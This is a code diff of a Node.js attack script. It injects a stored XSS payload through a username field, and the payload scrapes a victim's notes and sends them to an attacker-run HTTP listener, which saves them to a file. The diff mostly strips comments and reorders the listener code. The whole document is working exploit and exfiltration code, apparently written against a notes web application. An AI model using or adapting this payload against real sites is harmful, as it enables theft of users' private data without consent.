@@ -1,14 +1,8 @@
 const http = require('http');
 const fs = require('fs');
 const { URL } = require('url');
-
-// --- The Final, Correct Attack --- //
-
-// 1. The payload is a script that scrapes notes and sends them back.
 const exfiltration_script = `
 (async function() {
-    // This log will appear in the BROWSER console (F12)
-    console.log('[Payload] XSS via username executed!');
     try {
         const notes = [];
         let id = 1;
@@ -26,23 +20,7 @@ const exfiltration_script = `
 })();
 `;
 
-// 2. The username will be our script tag.
 const malicious_username = `<script>${exfiltration_script}</script>`;
-
-// --- Server and Injection Logic ---
-
-const server = http.createServer((req, res) => {
-    if (req.url.startsWith('/exfiltrated')) {
-        const data = new URL(req.url, `http://${req.headers.host}`).searchParams.get('data');
-        console.log('\n[Node] !!!!!!! VICTORY !!!!!!!');
-        console.log('[Node] Exfiltrated data received:');
-        fs.writeFileSync('results.txt', decodeURIComponent(data));
-        console.log('[Node] Data saved to results.txt.');
-        res.writeHead(204); // No content
-        res.end();
-        server.close(() => console.log('[Node] Server shut down.'));
-    }
-});
 
 async function inject() {
     console.log('[Node] Injecting malicious username...');
@@ -57,6 +35,18 @@ async function inject() {
         server.close();
     }
 }
+
+const server = http.createServer((req, res) => {
+    if (req.url.startsWith('/exfiltrated')) {
+        const data = new URL(req.url, `http://${req.headers.host}`).searchParams.get('data');
+        console.log('[Node] Exfiltrated data received:');
+        fs.writeFileSync('results.txt', decodeURIComponent(data));
+        console.log('[Node] Data saved to results.txt.');
+        res.writeHead(204); // No content
+        res.end();
+        server.close(() => console.log('[Node] Server shut down.'));
+    }
+});
 
 server.on('error', (e) => {
     if (e.code === 'EADDRINUSE') {
